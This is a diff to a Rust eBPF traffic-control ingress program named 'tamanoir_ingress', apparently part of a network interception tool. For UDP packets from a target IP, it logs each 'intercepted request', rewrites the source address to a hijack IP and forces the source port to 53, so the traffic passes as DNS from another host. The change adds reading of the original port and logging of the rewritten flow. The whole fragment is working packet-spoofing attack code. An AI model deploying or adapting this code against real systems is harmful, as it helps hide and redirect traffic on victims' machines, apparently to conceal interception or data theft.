@@ -1,11 +1,20 @@
-use aya_ebpf::{bindings::TC_ACT_PIPE, macros::classifier, programs::TcContext};
+use core::net::Ipv4Addr;
+
+use aya_ebpf::{
+    bindings::{TC_ACT_OK, TC_ACT_PIPE},
+    helpers::{bpf_get_hash_recalc, bpf_set_hash_invalid},
+    macros::classifier,
+    programs::TcContext,
+};
 use aya_log_ebpf::info;
 use network_types::{
     eth::{EthHdr, EtherType},
     ip::{IpProto, Ipv4Hdr},
 };
 
-use crate::common::{update_addr, update_port, UpdateType, HIJACK_IP, TARGET_IP};
+use crate::common::{
+    update_addr, update_port, UpdateType, HIJACK_IP, IP_SRC_ADDR_OFFSET, TARGET_IP, UDP_OFFSET,
+};
 
 #[classifier]
 pub fn tamanoir_ingress(mut ctx: TcContext) -> i32 {
@@ -27,9 +36,18 @@ fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, ()> {
         if let IpProto::Udp = header.proto {
             if u32::from_be(addr) == target_ip {
                 info!(ctx, "\n-----\nNew intercepted request:\n-----");
-
+                let udp_port = &ctx.load::<u16>(UDP_OFFSET).map_err(|_| ())?;
                 update_addr(ctx, &addr, &hijack_ip.to_be(), UpdateType::Src)?;
-                update_port(ctx, &53u16.to_be(), UpdateType::Src)?;
+                update_port(ctx, udp_port, &53u16.to_be(), UpdateType::Src)?;
+
+                info!(
+                    ctx,
+                    "{}:{} -> {}:{}",
+                    Ipv4Addr::from_bits(u32::from_be(addr)),
+                    u16::from_be(*udp_port),
+                    Ipv4Addr::from_bits(u32::from_be(ctx.load::<u32>(IP_SRC_ADDR_OFFSET).unwrap())),
+                    u16::from_be(ctx.load::<u16>(UDP_OFFSET).unwrap()),
+                );
             }
         };
     }
